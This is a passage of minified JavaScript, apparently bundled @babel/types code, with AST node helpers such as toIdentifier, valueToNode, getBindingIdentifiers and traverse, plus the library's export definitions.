GZ.EXPORTDECLARATION_TYPES=n1.FLIPPED_ALIAS_KEYS.ExportDeclaration,tt1=GZ.MODULESPECIFIER_TYPES=n1.FLIPPED_ALIAS_KEYS.ModuleSpecifier,et1=GZ.ACCESSOR_TYPES=n1.FLIPPED_ALIAS_KEYS.Accessor,Xe1=GZ.PRIVATE_TYPES=n1.FLIPPED_ALIAS_KEYS.Private,Je1=GZ.FLOW_TYPES=n1.FLIPPED_ALIAS_KEYS.Flow,Qe1=GZ.FLOWTYPE_TYPES=n1.FLIPPED_ALIAS_KEYS.FlowType,Ye1=GZ.FLOWBASEANNOTATION_TYPES=n1.FLIPPED_ALIAS_KEYS.FlowBaseAnnotation,We1=GZ.FLOWDECLARATION_TYPES=n1.FLIPPED_ALIAS_KEYS.FlowDeclaration,Ge1=GZ.FLOWPREDICATE_TYPES=n1.FLIPPED_ALIAS_KEYS.FlowPredicate,ze1=GZ.ENUMBODY_TYPES=n1.FLIPPED_ALIAS_KEYS.EnumBody,He1=GZ.ENUMMEMBER_TYPES=n1.FLIPPED_ALIAS_KEYS.EnumMember,Ue1=GZ.JSX_TYPES=n1.FLIPPED_ALIAS_KEYS.JSX,Ke1=GZ.MISCELLANEOUS_TYPES=n1.FLIPPED_ALIAS_KEYS.Miscellaneous,Ve1=GZ.TYPESCRIPT_TYPES=n1.FLIPPED_ALIAS_KEYS.TypeScript,Be1=GZ.TSTYPEELEMENT_TYPES=n1.FLIPPED_ALIAS_KEYS.TSTypeElement,qe1=GZ.TSTYPE_TYPES=n1.FLIPPED_ALIAS_KEYS.TSType,Ze1=GZ.TSBASETYPE_TYPES=n1.FLIPPED_ALIAS_KEYS.TSBaseType,Me1=GZ.MODULEDECLARATION_TYPES=h31});var nW=c((UZ)=>{Object.defineProperty(UZ,"__esModule",{value:!0});UZ.default=xU1;var C4=i0(),rW=l9();function xU1(X,J){if(C4.isBlockStatement(X))return X;let Q=[];if(C4.isEmptyStatement(X))Q=[];else{if(!C4.isStatement(X))if(C4.isFunction(J))X=rW.returnStatement(X);else X=rW.expressionStatement(X);Q=[X]}return rW.blockStatement(Q)}});var VZ=c((KZ)=>{Object.defineProperty(KZ,"__esModule",{value:!0});KZ.default=hU1;var gU1=nW();function hU1(X,J="body"){let Q=gU1.default(X[J],X);return X[J]=Q,Q}});var aW=c((BZ)=>{Object.defineProperty(BZ,"__esModule",{value:!0});BZ.default=cU1;var mU1=lJ(),uU1=C5();function cU1(X){X=X+"";let J="";for(let Q of X)J+=uU1.isIdentifierChar(Q.codePointAt(0))?Q:"-";if(J=J.replace(/^[-0-9]+/,""),J=J.replace(/[-\s]+(.)?/g,function(Q,Y){return Y?Y.toUpperCase():""}),!mU1.default(J))J=`_${J}`;return J||"_"}});var ZZ=c((qZ)=>{Object.defineProperty(qZ,"__esModule",{value:!0});qZ.default=dU1;var pU1=aW();function dU1(X){if(X=pU1.default(X),X==="eval"||X==="arguments")X="_"+X;return X}});var FZ=c((MZ)=>{Object.defineProperty(MZ,"__esModule",{value:!0});MZ.default=aU1;var rU1=i0(),nU1=l9();function aU1(X,J=X.key||X.property){if(!X.computed&&rU1.isIdentifier(J))J=nU1.stringLiteral(J.name);return J}});var RZ=c((jZ)=>{Object.defineProperty(jZ,"__esModule",{value:!0});jZ.default=void 0;var k5=i0(),Le1=jZ.default=oU1;function oU1(X){if(k5.isExpressionStatement(X))X=X.expression;if(k5.isExpression(X))return X;if(k5.isClass(X))X.type="ClassExpression",X.abstract=!1;else if(k5.isFunction(X))X.type="FunctionExpression";if(!k5.isExpression(X))throw new Error(`cannot turn ${X.type} to an expression`);return X}});var sW=c((LZ)=>{Object.defineProperty(LZ,"__esModule",{value:!0});LZ.default=b5;var tU1=Y8(),AZ=Symbol(),NZ=Symbol();function b5(X,J,Q){if(!X)return!1;let Y=tU1.VISITOR_KEYS[X.type];if(!Y)return!1;Q=Q||{};let W=J(X,Q);if(W!==void 0)switch(W){case AZ:return!1;case NZ:return!0}for(let z of Y){let G=X[z];if(!G)continue;if(Array.isArray(G)){for(let H of G)if(b5(H,J,Q))return!0}else if(b5(G,J,Q))return!0}return!1}b5.skip=AZ;b5.stop=NZ});var oW=c((wZ)=>{Object.defineProperty(wZ,"__esModule",{value:!0});wZ.default=QK1;var XK1=pJ(),DZ=["tokens","start","end","loc","raw","rawValue"],JK1=[...XK1.COMMENT_KEYS,"comments",...DZ];function QK1(X,J={}){let Q=J.preserveComments?DZ:JK1;for(let W of Q)if(X[W]!=null)X[W]=void 0;for(let W of Object.keys(X))if(W[0]==="_"&&X[W]!=null)X[W]=void 0;let Y=Object.getOwnPropertySymbols(X);for(let W of Y)X[W]=null}});var tW=c((IZ)=>{Object.defineProperty(IZ,"__esModule",{value:!0});IZ.default=zK1;var WK1=sW(),GK1=oW();function zK1(X,J){return WK1.default(X,GK1.default,J),X}});var SZ=c((PZ)=>{Object.defineProperty(PZ,"__esModule",{value:!0});PZ.default=$X;var CZ=i0(),UK1=s6(),KK1=tW();function $X(X,J=X.key){let Q;if(X.kind==="method")return $X.increment()+"";else if(CZ.isIdentifier(J))Q=J.name;else if(CZ.isStringLiteral(J))Q=JSON.stringify(J.value);else Q=JSON.stringify(KK1.default(UK1.default(J)));if(X.computed)Q=`[${Q}]`;if(X.static)Q=`static:${Q}`;return Q}$X.uid=0;$X.increment=function(){if($X.uid>=Number.MAX_SAFE_INTEGER)return $X.uid=0;else return $X.uid++}});var EZ=c((TZ)=>{Object.defineProperty(TZ,"__esModule",{value:!0});TZ.default=void 0;var P4=i0(),BK1=l9(),Se1=TZ.default=qK1;function qK1(X,J){if(P4.isStatement(X))return X;let Q=!1,Y;if(P4.isClass(X))Q=!0,Y="ClassDeclaration";else if(P4.isFunction(X))Q=!0,Y="FunctionDeclaration";else if(P4.isAssignmentExpression(X))return BK1.expressionStatement(X);if(Q&&!X.id)Y=!1;if(!Y)if(J)return!1;else throw new Error(`cannot turn ${X.type} to a statement`);return X.type=Y,X}});var bZ=c(($Z)=>{Object.defineProperty($Z,"__esModule",{value:!0});$Z.default=void 0;var ZK1=lJ(),Q9=l9(),_e1=$Z.default=eW,MK1=Function.call.bind(Object.prototype.toString);function FK1(X){return MK1(X)==="[object RegExp]"}function jK1(X){if(typeof X!=="object"||X===null||Object.prototype.toString.call(X)!=="[object Object]")return!1;let J=Object.getPrototypeOf(X);return J===null||Object.getPrototypeOf(J)===null}function eW(X){if(X===void 0)return Q9.identifier("undefined");if(X===!0||X===!1)return Q9.booleanLiteral(X);if(X===null)return Q9.nullLiteral();if(typeof X==="string")return Q9.stringLiteral(X);if(typeof X==="number"){let J;if(Number.isFinite(X))J=Q9.numericLiteral(Math.abs(X));else{let Q;if(Number.isNaN(X))Q=Q9.numericLiteral(0);else Q=Q9.numericLiteral(1);J=Q9.binaryExpression("/",Q,Q9.numericLiteral(0))}if(X<0||Object.is(X,-0))J=Q9.unaryExpression("-",J);return J}if(typeof X==="bigint")if(X<0)return Q9.unaryExpression("-",Q9.bigIntLiteral(-X));else return Q9.bigIntLiteral(X);if(FK1(X)){let J=X.source,Q=/\/([a-z]*)$/.exec(X.toString())[1];return Q9.regExpLiteral(J,Q)}if(Array.isArray(X))return Q9.arrayExpression(X.map(eW));if(jK1(X)){let J=[];for(let Q of Object.keys(X)){let Y,W=!1;if(ZK1.default(Q))if(Q==="__proto__")W=!0,Y=Q9.stringLiteral(Q);else Y=Q9.identifier(Q);else Y=Q9.stringLiteral(Q);J.push(Q9.objectProperty(Y,eW(X[Q]),W))}return Q9.objectExpression(J)}throw new Error("don't know how to turn this value into a node")}});var xZ=c((vZ)=>{Object.defineProperty(vZ,"__esModule",{value:!0});vZ.default=RK1;var OK1=l9();function RK1(X,J,Q=!1){return X.object=OK1.memberExpression(X.object,X.property,X.computed),X.property=J,X.computed=!!Q,X}});var hZ=c((gZ)=>{Object.defineProperty(gZ,"__esModule",{value:!0});gZ.default=LK1;var fZ=pJ(),NK1=iW();function LK1(X,J){if(!X||!J)return X;for(let Q of fZ.INHERIT_KEYS.optional)if(X[Q]==null)X[Q]=J[Q];for(let Q of Object.keys(J))if(Q[0]==="_"&&Q!=="__clone")X[Q]=J[Q];for(let Q of fZ.INHERIT_KEYS.force)X[Q]=J[Q];return NK1.default(X,J),X}});var mZ=c((yZ)=>{Object.defineProperty(yZ,"__esModule",{value:!0});yZ.default=CK1;var wK1=l9(),IK1=U0();function CK1(X,J){if(IK1.isSuper(X.object))throw new Error("Cannot prepend node to super property access (`super.foo`).");return X.object=wK1.memberExpression(J,X.object),X}});var cZ=c((uZ)=>{Object.defineProperty(uZ,"__esModule",{value:!0});uZ.default=SK1;function SK1(X){let J=[].concat(X),Q=Object.create(null);while(J.length){let Y=J.pop();if(!Y)continue;switch(Y.type){case"ArrayPattern":J.push(...Y.elements);break;case"AssignmentExpression":case"AssignmentPattern":case"ForInStatement":case"ForOfStatement":J.push(Y.left);break;case"ObjectPattern":J.push(...Y.properties);break;case"ObjectProperty":J.push(Y.value);break;case"RestElement":case"UpdateExpression":J.push(Y.argument);break;case"UnaryExpression":if(Y.operator==="delete")J.push(Y.argument);break;case"Identifier":Q[Y.name]=Y;break;default:break}}return Q}});var v5=c((lZ)=>{Object.defineProperty(lZ,"__esModule",{value:!0});lZ.default=XG;var D6=i0();function XG(X,J,Q,Y){let W=[].concat(X),z=Object.create(null);while(W.length){let G=W.shift();if(!G)continue;if(Y&&(D6.isAssignmentExpression(G)||D6.isUnaryExpression(G)||D6.isUpdateExpression(G)))continue;if(D6.isIdentifier(G)){if(J)(z[G.name]=z[G.name]||[]).push(G);else z[G.name]=G;continue}if(D6.isExportDeclaration(G)&&!D6.isExportAllDeclaration(G)){if(D6.isDeclaration(G.declaration))W.push(G.declaration);continue}if(Q){if(D6.isFunctionDeclaration(G)){W.push(G.id);continue}if(D6.isFunctionExpression(G))continue}let H=XG.keys[G.type];if(H)for(let U=0;U<H.length;U++){let K=H[U],V=G[K];if(V)if(Array.isArray(V))W.push(...V);else W.push(V)}}return z}var _K1={DeclareClass:["id"],DeclareFunction:["id"],DeclareModule:["id"],DeclareVariable:["id"],DeclareInterface:["id"],DeclareTypeAlias:["id"],DeclareOpaqueType:["id"],InterfaceDeclaration:["id"],TypeAlias:["id"],OpaqueType:["id"],CatchClause:["param"],LabeledStatement:["label"],UnaryExpression:["argument"],AssignmentExpression:["left"],ImportSpecifier:["local"],ImportNamespaceSpecifier:["local"],ImportDefaultSpecifier:["local"],ImportDeclaration:["specifiers"],TSImportEqualsDeclaration:["id"],ExportSpecifier:["exported"],ExportNamespaceSpecifier:["exported"],ExportDefaultSpecifier:["exported"],FunctionDeclaration:["id","params"],FunctionExpression:["id","params"],ArrowFunctionExpression:["params"],ObjectMethod:["params"],ClassMethod:["params"],ClassPrivateMethod:["params"],ForInStatement:["left"],ForOfStatement:["left"],ClassDeclaration:["id"],ClassExpression:["id"],RestElement:["argument"],UpdateExpression:["argument"],ObjectProperty:["value"],AssignmentPattern:["left"],ArrayPattern:["elements"],ObjectPattern:["properties"],VariableDeclaration:["declarations"],VariableDeclarator:["id"]};XG.keys=_K1});var iZ=c((pZ)=>{Object.defineProperty(pZ,"__esModule",{value:!0});pZ.default=void 0;var $K1=v5(),fe1=pZ.default=kK1;function kK1(X,J){return $K1.default(X,J,!0)}});var aZ=c((nZ)=>{Object.defineProperty(nZ,"__esModule",{value:!0});nZ.default=vK1;var W8=i0();function bK1(X){if(W8.isNullLiteral(X))return"null";if(W8.isRegExpLiteral(X))return`/${X.pattern}/${X.flags}`;if(W8.isTemplateLiteral(X))return X.quasis.map((J)=>J.value.raw).join("");if(X.value!==void 0)return String(X.value);return null}function rZ(X){if(!X.computed||W8.isLiteral(X.key))return X.key}function vK1(X,J){if("id"in X&&X.id)return{name:X.id.name,originalNode:X.id};let Q="",Y;if(W8.isObjectProperty(J,{value:X}))Y=rZ(J);else if(W8.isObjectMethod(X)||W8.isClassMethod(X)){if(Y=rZ(X),X.kind==="get")Q="get ";else if(X.kind==="set")Q="set "}else if(W8.isVariableDeclarator(J,{init:X}))Y=J.id;else if(W8.isAssignmentExpression(J,{operator:"=",right:X}))Y=J.left;if(!Y)return null;let W=W8.isLiteral(Y)?bK1(Y):W8.isIdentifier(Y)?Y.name:W8.isPrivateName(Y)?Y.id.name:null;if(W==null)return null;return{name:Q+W,originalNode:Y}}});var oZ=c((sZ)=>{Object.defineProperty(sZ,"__esModule",{value:!0});sZ.default=gK1;var fK1=Y8();function gK1(X,J,Q){if(typeof J==="function")J={enter:J};let{enter:Y,exit:W}=J;JG(X,Y,W,Q,[])}function JG(X,J,Q,Y,W){let z=fK1.VISITOR_KEYS[X.type];if(!z)return;if(J)J(X,W,Y);for(let G of z){let H=X[G];if(Array.isArray(H))for(let U=0;U<H.length;U++){let K=H[U];if(!K)continue;W.push({node:X,key:G,index:U}),JG(K,J,Q,Y,W),W.pop()}else if(H)W.push({node:X,key:G}),JG(H,J,Q,Y,W),W.pop()}if(Q)Q(X,W,Y)}});var eZ=c((tZ)=>{Object.defineProperty(tZ,"__esModule",{value:!0});tZ.default=mK1;var yK1=v5();function mK1(X,J,Q){if(Q&&X.type==="Identifier"&&J.type==="ObjectProperty"&&Q.type==="ObjectExpression")return!1;let Y=yK1.default.keys[J.type];if(Y)for(let W=0;W<Y.length;W++){let z=Y[W],G=J[z];if(Array.isArray(G)){if(G.includes(X))return!0}else if(G===X)return!0}return!1}});var YG=c((XM)=>{Object.defineProperty(XM,"__esModule",{value:!0});XM.default=lK1;var cK1=i0();QG=Symbol.for("var used to be block scoped");var QG;function lK1(X){return cK1.isVariableDeclaration(X)&&(X.kind!=="var"||X[QG])}});var YM=c((QM)=>{Object.defineProperty(QM,"__esModule",{value:!0});QM.default=iK1;var JM=i0(),dK1=YG();function iK1(X){return JM.isFunctionDeclaration(X)||JM.isClassDeclaration(X)||dK1.default(X)}});var GM=c((WM)=>{Object.defineProperty(WM,"__esModule",{value:!0});WM.default=sK1;var nK1=M4(),aK1=i0();function sK1(X){if(nK1.default(X.type,"Immutable"))return!0;if(aK1.isIdentifier(X))if(X.name==="undefined")return!0;else return!1;return!1}});var UM=c((HM)=>{Object.defineProperty(HM,"__esModule",{value:!0});HM.default=WG;var zM=Y8();function WG(X,J){if(typeof X!=="object"||typeof J!=="object"||X==null||J==null)return X===J;if(X.type!==J.type)return!1;let Q=Object.keys(zM.NODE_FIELDS[X.type]||X.type),Y=zM.VISITOR_KEYS[X.type];for(let W of Q){let z=X[W],G=J[W];if(typeof z!==typeof G)return!1;if(z==null&&G==null)continue;else if(z==null||G==null)return!1;if(Array.isArray(z)){if(!Array.isArray(G))return!1;if(z.length!==G.length)return!1;for(let H=0;H<z.length;H++)if(!WG(z[H],G[H]))return!1;continue}if(typeof z==="object"&&!(Y!=null&&Y.includes(W))){for(let H of Object.keys(z))if(z[H]!==G[H])return!1;continue}if(!WG(z,G))return!1}return!0}});var VM=c((KM)=>{Object.defineProperty(KM,"__esModule",{value:!0});KM.default=eK1;function eK1(X,J,Q){switch(J.type){case"MemberExpression":case"OptionalMemberExpression":if(J.property===X)return!!J.computed;return J.object===X;case"JSXMemberExpression":return J.object===X;case"VariableDeclarator":return J.init===X;case"ArrowFunctionExpression":return J.body===X;case"PrivateName":return!1;case"ClassMethod":case"ClassPrivateMethod":case"ObjectMethod":if(J.key===X)return!!J.computed;return!1;case"ObjectProperty":if(J.key===X)return!!J.computed;return!Q||Q.type!=="ObjectPattern";case"ClassProperty":case"ClassAccessorProperty":if(J.key===X)return!!J.computed;return!0;case"ClassPrivateProperty":return J.key!==X;case"ClassDeclaration":case"ClassExpression":return J.superClass===X;case"AssignmentExpression":return J.right===X;case"AssignmentPattern":return J.right===X;case"LabeledStatement":return!1;case"CatchClause":return!1;case"RestElement":return!1;case"BreakStatement":case"ContinueStatement":return!1;case"FunctionDeclaration":case"FunctionExpression":return!1;case"ExportNamespaceSpecifier":case"ExportDefaultSpecifier":return!1;case"ExportSpecifier":if(Q!=null&&Q.source)return!1;return J.local===X;case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":return!1;case"ImportAttribute":return!1;case"JSXAttribute":return!1;case"ObjectPattern":case"ArrayPattern":return!1;case"MetaProperty":return!1;case"ObjectTypeProperty":return J.key!==X;case"TSEnumMember":return J.id!==X;case"TSPropertySignature":if(J.key===X)return!!J.computed;return!0}return!0}});var qM=c((BM)=>{Object.defineProperty(BM,"__esModule",{value:!0});BM.default=JV1;var kX=i0();function JV1(X,J){if(kX.isBlockStatement(X)&&(kX.isFunction(J)||kX.isCatchClause(J)))return!1;if(kX.isPattern(X)&&(kX.isFunction(J)||kX.isCatchClause(J)))return!0;return kX.isScopable(X)}});var FM=c((MM)=>{Object.defineProperty(MM,"__esModule",{value:!0});MM.default=YV1;var ZM=i0();function YV1(X){return ZM.isImportDefaultSpecifier(X)||ZM.isIdentifier(X.imported||X.exported,{name:"default"})}});var OM=c((jM)=>{Object.defineProperty(jM,"__esModule",{value:!0});jM.default=HV1;var GV1=lJ(),zV1=new Set(["abstract","boolean","byte","char","double","enum","final","float","goto","implements","int","interface","long","native","package","private","protected","public","short","static","synchronized","throws","transient","volatile"]);function HV1(X){return GV1.default(X)&&!zV1.has(X)}});var AM=c((RM)=>{Object.defineProperty(RM,"__esModule",{value:!0});RM.default=VV1;var KV1=i0();GG=Symbol.for("var used to be block scoped");var GG;function VV1(X){return KV1.isVariableDeclaration(X,{kind:"var"})&&!X[GG]}});var LM=c((NM)=>{Object.defineProperty(NM,"__esModule",{value:!0});NM.default=S4;var qV1=v5(),bX=i0(),zG=l9(),HG=mW(),ZV1=s6();function S4(X,J){let Q=[],Y=!0;for(let W of X){if(!bX.isEmptyStatement(W))Y=!1;if(bX.isExpression(W))Q.push(W);else if(bX.isExpressionStatement(W))Q.push(W.expression);else if(bX.isVariableDeclaration(W)){if(W.kind!=="var")return;for(let z of W.declarations){let G=qV1.default(z);for(let H of Object.keys(G))J.push({kind:W.kind,id:ZV1.default(G[H])});if(z.init)Q.push(zG.assignmentExpression("=",z.id,z.init))}Y=!0}else if(bX.isIfStatement(W)){let z=W.consequent?S4([W.consequent],J):HG.buildUndefinedNode(),G=W.alternate?S4([W.alternate],J):HG.buildUndefinedNode();if(!z||!G)return;Q.push(zG.conditionalExpression(W.test,z,G))}else if(bX.isBlockStatement(W)){let z=S4(W.body,J);if(!z)return;Q.push(z)}else if(bX.isEmptyStatement(W)){if(X.indexOf(W)===0)Y=!0}else return}if(Y)Q.push(HG.buildUndefinedNode());if(Q.length===1)return Q[0];else return zG.sequenceExpression(Q)}});var wM=c((DM)=>{Object.defineProperty(DM,"__esModule",{value:!0});DM.default=jV1;var FV1=LM();function jV1(X,J){if(!(X!=null&&X.length))return;let Q=[],Y=FV1.default(X,Q);if(!Y)return;for(let W of Q)J.push(W);return Y}});var U0=c((D1)=>{Object.defineProperty(D1,"__esModule",{value:!0});var o6={react:!0,assertNode:!0,createTypeAnnotationBasedOnTypeof:!0,createUnionTypeAnnotation:!0,createFlowUnionType:!0,createTSUnionType:!0,cloneNode:!0,clone:!0,cloneDeep:!0,cloneDeepWithoutLoc:!0,cloneWithoutLoc:!0,addComment:!0,addComments:!0,inheritInnerComments:!0,inheritLeadingComments:!0,inheritsComments:!0,inheritTrailingComments:!0,removeComments:!0,ensureBlock:!0,toBindingIdentifierName:!0,toBlock:!0,toComputedKey:!0,toExpression:!0,toIdentifier:!0,toKeyAlias:!0,toStatement:!0,valueToNode:!0,appendToMemberExpression:!0,inherits:!0,prependToMemberExpression:!0,removeProperties:!0,removePropertiesDeep:!0,removeTypeDuplicates:!0,getAssignmentIdentifiers:!0,getBindingIdentifiers:!0,getOuterBindingIdentifiers:!0,getFunctionName:!0,traverse:!0,traverseFast:!0,shallowEqual:!0,is:!0,isBinding:!0,isBlockScoped:!0,isImmutable:!0,isLet:!0,isNode:!0,isNodesEquivalent:!0,isPlaceholderType:!0,isReferenced:!0,isScope:!0,isSpecifierDefault:!0,isType:!0,isValidES3Identifier:!0,isValidIdentifier:!0,isVar:!0,matchesPattern:!0,validate:!0,buildMatchMemberExpression:!0,__internal__deprecationWarning:!0};Object.defineProperty(D1,"__internal__deprecationWarning",{enumerable:!0,get:function(){return LB1.default}});Object.defineProperty(D1,"addComment",{enumerable:!0,get:function(){return _V1.default}});Object.defineProperty(D1,"addComments",{enumerable:!0,get:function(){return EV1.default}});Object.defineProperty(D1,"appendToMemberExpression",{enumerable:!0,get:function(){return dV1.default}});Object.defineProperty(D1,"assertNode",{enumerable:!0,get:function(){return LV1.default}});Object.defineProperty(D1,"buildMatchMemberExpression",{enumerable:!0,get:function(){return NB1.default}});Object.defineProperty(D1,"clone",{enumerable:!0,get:function(){return CV1.default}});Object.defineProperty(D1,"cloneDeep",{enumerable:!0,get:function(){return PV1.default}});Object.defineProperty(D1,"cloneDeepWithoutLoc",{enumerable:!0,get:function(){return SV1.default}});Object.defineProperty(D1,"cloneNode",{enumerable:!0,get:function(){return IV1.default}});Object.defineProperty(D1,"cloneWithoutLoc",{enumerable:!0,get:function(){return TV1.default}});Object.defineProperty(D1,"createFlowUnionType",{enumerable:!0,get:function(){return IM.default}});Object.defineProperty(D1,"createTSUnionType",{enumerable:!0,get:function(){return wV1.default}});Object.defineProperty(D1,"createTypeAnnotationBasedOnTypeof",{enumerable:!0,get:function(){return DV1.default}});Object.defineProperty(D1,"createUnionTypeAnnotation",{enumerable:!0,get:function(){return IM.default}});Object.defineProperty(D1,"ensureBlock",{enumerable:!0,get:function(){return fV1.default}});Object.defineProperty(D1,"getAssignmentIdentifiers",{enumerable:!0,get:function(){return oV1.default}});Object.defineProperty(D1,"getBindingIdentifiers",{enumerable:!0,get:function(){return tV1.default}});Object.defineProperty(D1,"getFunctionName",{enumerable:!0,get:function(){return XB1.default}});Object.defineProperty(D1,"getOuterBindingIdentifiers",{enumerable:!0,get:function(){return eV1.default}});Object.defineProperty(D1,"inheritInnerComments",{enumerable:!0,get:function(){return $V1.default}});Object.defineProperty(D1,"inheritLeadingComments",{enumerable:!0,get:function(){return kV1.default}});Object.defineProperty(D1,"inheritTrailingComments",{enumerable:!0,get:function(){return vV1.default}});Object.defineProperty(D1,"inherits",{enumerable:!0,get:function(){return iV1.default}});Object.defineProperty(D1,"inheritsComments",{enumerable:!0,get:function(){return bV1.default}});Object.defineProperty(D1,"is",{enumerable:!0,get:function(){return YB1.default}});Object.defineProperty(D1,"isBinding",{enumerable:!0,get:function(){return WB1.default}});Object.defineProperty(D1,"isBlockScoped",{enumerable:!0,get:function(){return GB1.default}});Object.defineProperty(D1,"isImmutable",{enumerable:!0,get:function(){return zB1.default}});Object.defineProperty(D1,"isLet",{enumerable:!0,get:function(){return HB1.default}});Object.defineProperty(D1,"isNode",{enumerable:!0,get:function(){return UB1.default}});Object.defineProperty(D1,"isNodesEquivalent",{enumerable:!0,get:function(){return KB1.default}});Object.defineProperty(D1,"isPlaceholderType",{enumerable:!0,get:function(){return VB1.default}});Object.defineProperty(D1,"isReferenced",{enumerable:!0,get:function(){return BB1.default}});Object.defineProperty(D1,"isScope",{enumerable:!0,get:function(){return qB1.default}});Object.defineProperty(D1,"isSpecifierDefault",{enumerable:!0,get:function(){return ZB1.default}});Object.defineProperty(D1,"isType",{enumerable:!0,get:function(){return MB1.default}});Object.defineProperty(D1,"isValidES3Identifier",{enumerable:!0,get:function(){return FB1.default}});Object.defineProperty(D1,"isValidIdentifier",{enumerable:!0,get:function(){return jB1.default}});Object.defineProperty(D1,"isVar",{enumerable:!0,get:function(){return OB1.default}});Object.defineProperty(D1,"matchesPattern",{enumerable:!0,get:function(){return RB1.default}});Object.defineProperty(D1,"prependToMemberExpression",{enumerable:!0,get:function(){return rV1.default}});D1.react=void 0;Object.defineProperty(D1,"removeComments",{enumerable:!0,get:function(){return xV1.default}});Object.defineProperty(D1,"removeProperties",{enumerable:!0,get:function(){return nV1.default}});Object.defineProperty(D1,"removePropertiesDeep",{enumerable:!0,get:function(){return aV1.default}});Object.defineProperty(D1,"removeTypeDuplicates",{enumerable:!0,get:function(){return sV1.default}});Object.defineProperty(D1,"shallowEqual",{enumerable:!0,get:function(){return QB1.default}});Object.defineProperty(D1,"toBindingIdentifierName",{enumerable:!0,get:function(){return gV1.default}});Object.defineProperty(D1,"toBlock",{enumerable:!0,get:function(){return hV1.default}});Object.defineProperty(D1,"toComputedKey",{enumerable:!0,get:function(){return yV1.default}});Object.defineProperty(D1,"toExpression",{enumerable:!0,get:function(){return mV1.default}});Object.defineProperty(D1,"toIdentifier",{enumerable:!0,get:function(){return uV1.default}});Object.defineProperty(D1,"toKeyAlias",{enumerable:!0,get:function(){return cV1.default}});Object.defineProperty(D1,"toStatement",{enumerable:!0,get:function(){return lV1.default}});Object.defineProperty(D1,"traverse",{enumerable:!0,get:function(){return T4.default}});Object.defineProperty(D1,"traverseFast",{enumerable:!0,get:function(){return JB1.default}});Object.defineProperty(D1,"validate",{enumerable:!0,get:function(){return AB1.default}});Object.defineProperty(D1,"valueToNode",{enumerable:!0,get:function(){return pV1.default}});var RV1=nV(),AV1=sV(),NV1=Mq(),LV1=Oq(),UG=Aq();Object.keys(UG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===UG[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return UG[X]}})});var DV1=Dq(),IM=Sq(),wV1=bq(),KG=mW();Object.keys(KG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===KG[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return KG[X]}})});var VG=l9();Object.keys(VG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===VG[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return VG[X]}})});var IV1=s6(),CV1=cq(),PV1=pq(),SV1=iq(),TV1=nq(),_V1=oq(),EV1=cW(),$V1=lW(),kV1=pW(),bV1=iW(),vV1=dW(),xV1=WZ(),BG=HZ();Object.keys(BG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===BG[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return BG[X]}})});var qG=pJ();Object.keys(qG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===qG[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return qG[X]}})});var fV1=VZ(),gV1=ZZ(),hV1=nW(),yV1=FZ(),mV1=RZ(),uV1=aW(),cV1=SZ(),lV1=EZ(),pV1=bZ(),ZG=Y8();Object.keys(ZG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===ZG[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return ZG[X]}})});var dV1=xZ(),iV1=hZ(),rV1=mZ(),nV1=oW(),aV1=tW(),sV1=yW(),oV1=cZ(),tV1=v5(),eV1=iZ(),XB1=aZ(),T4=oZ();Object.keys(T4).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===T4[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return T4[X]}})});var JB1=sW(),QB1=Z4(),YB1=cJ(),WB1=eZ(),GB1=YM(),zB1=GM(),HB1=YG(),UB1=hW(),KB1=UM(),VB1=MW(),BB1=VM(),qB1=qM(),ZB1=FM(),MB1=M4(),FB1=OM(),jB1=lJ(),OB1=AM(),RB1=qW(),AB1=R4(),NB1=ZW(),MG=i0();Object.keys(MG).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(o6,X))return;if(X in D1&&D1[X]===MG[X])return;Object.defineProperty(D1,X,{enumerable:!0,get:function(){return MG[X]}})});var LB1=uJ(),DB1=wM(),te1=D1.react={isReactComponent:RV1.default,isCompatTag:AV1.default,buildChildren:NV1.default};D1.toSequenceExpression=DB1.default;if(process.env.BABEL_TYPES_8_BREAKING)console.warn("BABEL_TYPES_8_BREAKING is not supported anymore. Use the latest Babel 8.0.0 pre-release instead!")});var jG=c((TM)=>{Object.defineProperty(TM,"__esModule",{value:!0});TM.isBindingIdentifier=dB1;TM.isBlockScoped=sB1;TM.isExpression=rB1;TM.isFlow=Jq1;TM.isForAwaitStatement=Wq1;TM.isGenerated=eB1;TM.isPure=Xq1;TM.isReferenced=aB1;TM.isReferencedIdentifier=lB1;TM.isReferencedMemberExpression=pB1;TM.isRestProperty=Qq1;TM.isScope=nB1;TM.isSpreadProperty=Yq1;TM.isStatement=iB1;TM.isUser=tB1;TM.isVar=oB1;var wB1=U0(),{isBinding:IB1,isBlockScoped:CB1,isExportDeclaration:PB1,isExpression:SB1,isFlow:TB1,isForStatement:_B1,isForXStatement:EB1,isIdentifier:PM,isImportDeclaration:$B1,isImportSpecifier:kB1,isJSXIdentifier:bB1,isJSXMemberExpression:vB1,isMemberExpression:xB1,isRestElement:SM,isReferenced:FG,isScope:fB1,isStatement:gB1,isVar:hB1,isVariableDeclaration:yB1,react:mB1,isForOfStatement:uB1}=wB1,{isCompatTag:cB1}=mB1;function lB1(X){let{node:J,parent:Q}=this;if(!PM(J,X)&&!vB1(Q,X))if(bB1(J,X)){if(cB1(J.name))return!1}else return!1;return FG(J,Q,this.parentPath.parent)}function pB1(){let{node:X,parent:J}=this;return 